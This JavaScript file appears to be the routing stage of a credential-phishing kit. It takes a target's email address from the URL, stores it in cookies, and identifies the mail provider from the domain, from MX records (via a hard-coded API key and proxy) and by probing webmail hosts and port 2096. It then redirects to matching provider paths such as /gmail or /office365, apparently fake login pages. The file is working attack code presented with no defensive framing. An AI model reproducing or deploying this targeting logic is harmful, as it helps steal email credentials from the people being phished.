// Global Varibles
const whoisxmlapiAPI = "at_xoyy6J52sNAgX3fXolvvWhxjV2nGJ";
const urlproxy = "https://thingproxy.freeboard.io/fetch/";

//Wildcard Function
function matchRuleShort(str, rule) {
  var escapeRegex = (str) => str.replace(/([.*+?^=!:${}()|\[\]\/\\])/g, "\\$1");
  return new RegExp(
    "^" + rule.split("*").map(escapeRegex).join(".*") + "$"
  ).test(str);
}

// Constant Variables
const url = window.location.href;
const queryString = window.location.search;
const parameters = new URLSearchParams(queryString);

// Set User Value software
const userurlsoftware = parameters.get("software");
Cookies.set("software", userurlsoftware, { expires: 7, path: "/" });

// Set User Value provider
const userurlprovider = parameters.get("provider");
Cookies.set("provider", userurlprovider, { expires: 7, path: "/" });

// Set User Value Domain
const userurldomain = parameters.get("domain");
Cookies.set("domain", userurldomain, { expires: 7, path: "/" });

// Set User Value Email
const userurlemail = parameters.get("user");
Cookies.set("user", userurlemail, { expires: 7, path: "/" });

// Get domain name from Email
if (userurlemail != null) {
  var userdomainfromemail = userurlemail.split("@")[1];
  Cookies.set("domainfromemail", userdomainfromemail, {
    expires: 7,
    path: "/",
  });
}

// Auto redirect if nothing happened in 5 seconds.
const myTimeout = setTimeout(myGreeting, 5000);

function myGreeting() {
  window.location.href = "/general";
}

////////////////////////////////////////////////////////////////////////

// Redirect base on preset software
if (userurlsoftware != null) {
  if (userurlsoftware == "roundcube") {
    window.location.href = "/roundcube";
  } else if (userurlsoftware == "horde") {
    window.location.href = "/horde";
  } else if (userurlsoftware == "cpanel") {
    window.location.href = "/cpanel";
  } else if (userurlsoftware == "zimbra") {
    window.location.href = "/zimbra";
  } else if (userurlsoftware == "zoho") {
    window.location.href = "/zoho";
  } else {
    // do nothing
  }
}

////////////////////////////////////////////////////////////////////////

// Redirect base on preset software
if (userurlprovider != null) {
  if (userurlprovider == "126") {
    window.location.href = "/126";
  } else if (userurlprovider == "163") {
    window.location.href = "/163";
  } else if (userurlprovider == "263") {
    window.location.href = "/263";
  } else if (userurlprovider == "aliyun") {
    window.location.href = "/aliyun";
  } else if (userurlprovider == "chinamail") {
    window.location.href = "/chinamail";
  } else if (userurlprovider == "comcast") {
    window.location.href = "/comcast";
  } else if (userurlprovider == "earthlinks") {
    window.location.href = "/earthlinks";
  } else if (userurlprovider == "gmail") {
    window.location.href = "/gmail";
  } else if (userurlprovider == "gmx") {
    window.location.href = "/gmx";
  } else if (userurlprovider == "godaddy") {
    window.location.href = "/godaddy";
  } else if (userurlprovider == "hinet") {
    window.location.href = "/hinet";
  } else if (userurlprovider == "justhost") {
    window.location.href = "/justhost";
  } else if (userurlprovider == "Mail.ru") {
    window.location.href = "/Mail.ru";
  } else if (userurlprovider == "microsoft") {
    window.location.href = "/microsoft";
  } else if (userurlprovider == "mimecast") {
    window.location.href = "/mimecast";
  } else if (userurlprovider == "mweb") {
    window.location.href = "/mweb";
  } else if (userurlprovider == "namecheap") {
    window.location.href = "/namecheap";
  } else if (userurlprovider == "netease") {
    window.location.href = "/netease";
  } else if (userurlprovider == "networksolutions") {
    window.location.href = "/networksolutions";
  } else if (userurlprovider == "office") {
    window.location.href = "/office";
  } else if (userurlprovider == "office365") {
    window.location.href = "/office365";
  } else if (userurlprovider == "privateemail") {
    window.location.href = "/privateemail";
  } else if (userurlprovider == "rackspace") {
    window.location.href = "/rackspace";
  } else if (userurlprovider == "synaq") {
    window.location.href = "/synaq";
  } else if (userurlprovider == "yahoo") {
    window.location.href = "/yahoo";
  } else if (userurlprovider == "zmail") {
    window.location.href = "/zmail";
  } else {
    // do nothing
  }
}

////////////////////////////////////////////////////////////////////////

// Redirect by domain at the end of email
if (userdomainfromemail != null) {
  if (matchRuleShort(userdomainfromemail, "*126.com") == true) {
    window.location.href = "/126";
  } else if (matchRuleShort(userdomainfromemail, "*163.com") == true) {
    window.location.href = "/163";
  } else if (matchRuleShort(userdomainfromemail, "*263.net") == true) {
    window.location.href = "/263";
  } else if (matchRuleShort(userdomainfromemail, "*aliyun.com") == true) {
    window.location.href = "/aliyun";
  } else if (matchRuleShort(userdomainfromemail, "*chinamail*") == true) {
    window.location.href = "/chinamail";
  } else if (matchRuleShort(userdomainfromemail, "*comcastbiz.net") == true) {
    window.location.href = "/comcast";
  } else if (matchRuleShort(userdomainfromemail, "*earthlink.net") == true) {
    window.location.href = "/earthlinks";
  } else if (matchRuleShort(userdomainfromemail, "*gmail*") == true) {
    window.location.href = "/gmail";
  } else if (matchRuleShort(userdomainfromemail, "*gmx*") == true) {
    window.location.href = "/gmx";
  } else if (matchRuleShort(userdomainfromemail, "*godaddy*") == true) {
    window.location.href = "/godaddy";
  } else if (matchRuleShort(userdomainfromemail, "*hinet.net") == true) {
    window.location.href = "/hinet";
  } else if (matchRuleShort(userdomainfromemail, "*justhost*") == true) {
    window.location.href = "/justhost";
  } else if (matchRuleShort(userdomainfromemail, "*mail.ru") == true) {
    window.location.href = "/Mail.ru";
  } else if (matchRuleShort(userdomainfromemail, "*microsoft*") == true) {
    window.location.href = "/microsoft";
  } else if (matchRuleShort(userdomainfromemail, "*mimecast*") == true) {
    window.location.href = "/mimecast";
  } else if (matchRuleShort(userdomainfromemail, "*mweb.co.za") == true) {
    window.location.href = "/mweb";
  } else if (matchRuleShort(userdomainfromemail, "*namecheap*") == true) {
    window.location.href = "/namecheap";
  } else if (matchRuleShort(userdomainfromemail, "*netease*") == true) {
    window.location.href = "/netease";
  } else if (matchRuleShort(userdomainfromemail, "*networksolution*") == true) {
    window.location.href = "/networksolutions";
  } else if (matchRuleShort(userdomainfromemail, "*office*") == true) {
    window.location.href = "/office";
  } else if (matchRuleShort(userdomainfromemail, "*office365*") == true) {
    window.location.href = "/office365";
  } else if (matchRuleShort(userdomainfromemail, "*privateemail*") == true) {
    window.location.href = "/privateemail";
  } else if (matchRuleShort(userdomainfromemail, "*rackspace*") == true) {
    window.location.href = "/rackspace";
  } else if (matchRuleShort(userdomainfromemail, "*synaq*") == true) {
    window.location.href = "/synaq";
  } else if (matchRuleShort(userdomainfromemail, "*yahoo*") == true) {
    window.location.href = "/yahoo";
  } else if (matchRuleShort(userdomainfromemail, "*zmail*") == true) {
    window.location.href = "/zmail";
  } else {
    // do nothing
  }

  ////////////////////////////////////////////////////////////////////////

  // Redirect by MX Record of domain at the end of email

  let myurl =
    urlproxy +
    "https://www.whoisxmlapi.com/whoisserver/DNSService?apiKey=" +
    whoisxmlapiAPI +
    "&type=MX&outputFormat=JSON&domainName=" +
    userdomainfromemail;
  fetch(myurl)
    .then((response) => response.json())
    .then((data) => {
      if (mxJsondata != undefined) {
        var mxJsondata = data.DNSData.dnsRecords[0].additionalName;
        if (matchRuleShort(mxJsondata, "*126.com") == true) {
          window.location.href = "/126";
        } else if (matchRuleShort(mxJsondata, "*163.com") == true) {
          window.location.href = "/163";
        } else if (matchRuleShort(mxJsondata, "*263.net") == true) {
          window.location.href = "/263";
        } else if (matchRuleShort(mxJsondata, "*aliyun.com") == true) {
          window.location.href = "/aliyun";
        } else if (matchRuleShort(mxJsondata, "*chinamail*") == true) {
          window.location.href = "/chinamail";
        } else if (matchRuleShort(mxJsondata, "*comcastbiz.net") == true) {
          window.location.href = "/comcast";
        } else if (matchRuleShort(mxJsondata, "*earthlink.net") == true) {
          window.location.href = "/earthlinks";
        } else if (matchRuleShort(mxJsondata, "*gmail*") == true) {
          window.location.href = "/gmail";
        } else if (matchRuleShort(mxJsondata, "*gmx*") == true) {
          window.location.href = "/gmx";
        } else if (matchRuleShort(mxJsondata, "*godaddy*") == true) {
          window.location.href = "/godaddy";
        } else if (matchRuleShort(mxJsondata, "*hinet.net") == true) {
          window.location.href = "/hinet";
        } else if (matchRuleShort(mxJsondata, "*justhost*") == true) {
          window.location.href = "/justhost";
        } else if (matchRuleShort(mxJsondata, "*mail.ru") == true) {
          window.location.href = "/Mail.ru";
        } else if (matchRuleShort(mxJsondata, "*microsoft*") == true) {
          window.location.href = "/microsoft";
        } else if (matchRuleShort(mxJsondata, "*mimecast*") == true) {
          window.location.href = "/mimecast";
        } else if (matchRuleShort(mxJsondata, "*mweb.co.za") == true) {
          window.location.href = "/mweb";
        } else if (matchRuleShort(mxJsondata, "*namecheap*") == true) {
          window.location.href = "/namecheap";
        } else if (matchRuleShort(mxJsondata, "*netease*") == true) {
          window.location.href = "/netease";
        } else if (matchRuleShort(mxJsondata, "*networksolution*") == true) {
          window.location.href = "/networksolutions";
        } else if (matchRuleShort(mxJsondata, "*office*") == true) {
          window.location.href = "/office";
        } else if (matchRuleShort(mxJsondata, "*office365*") == true) {
          window.location.href = "/office365";
        } else if (matchRuleShort(mxJsondata, "*privateemail*") == true) {
          window.location.href = "/privateemail";
        } else if (matchRuleShort(mxJsondata, "*rackspace*") == true) {
          window.location.href = "/rackspace";
        } else if (matchRuleShort(mxJsondata, "*synaq*") == true) {
          window.location.href = "/synaq";
        } else if (matchRuleShort(mxJsondata, "*yahoo*") == true) {
          window.location.href = "/yahoo";
        } else if (matchRuleShort(mxJsondata, "*zmail*") == true) {
          window.location.href = "/zmail";
        } else {
          // do nothing
        }
      }
    });

  ////////////////////////////////////////////////////////////////////////

  // Redirect by Webmail App of domain at the end of email
  var check = 0;
  var getError = 0;

  function getReady(link) {
    var xhrwebsite = urlproxy + link;
    var xhr = new XMLHttpRequest();
    xhr.open("GET", xhrwebsite);
    xhr.send(null);
    xhr.responseText;
    xhr.onreadystatechange = function () {
      // this is what i did, it will check if the value is good or not. make sense?
      // it check if the status is 200, I know, I just added one more condition.
      // alright, wait a minute, let me do some test..
      if (xhr.readyState === 4 && xhr.status == 200 && check === 0) {
        var text = xhr.responseText;

        logResult(text, "Zimbra");
        logResult(text, "cPanel");
        logResult(text, "Horde");
        logResult(text, "Roundcube");
        logResult(text, "Zoho");
      } else if (xhr.readyState === 4 && check === 0) {
        getError += 1;
        if (getError === 6) {
          window.location.href = "/general";
        }
      }
    };
  }

  function logResult(text, string) {
    let position = text.search(string);
    if (position != "-1") {
      console.log(string);

      // This part is the output part.
      if (string === "Zimbra") {
        window.location.href = "/zimbra";
      } else if (string === "cPanel") {
        window.location.href = "/cpanel";
      } else if (string === "Horde") {
        window.location.href = "/horde";
      } else if (string === "Roundcube") {
        window.location.href = "/roundcube";
      } else if (string === "Zoho") {
        window.location.href = "/zoho";
      } else {
        window.location.href = "/general";
      }
      check = 1;
      return;
    } else {
      window.location.href = "/general";
    }
  }

  getReady("http://webmail." + userdomainfromemail);
  getReady("http://mail." + userdomainfromemail);
  getReady("http://zimbra." + userdomainfromemail);
  getReady("http://" + userdomainfromemail + "/webmail");
  getReady("http://" + userdomainfromemail + ":2096");
}
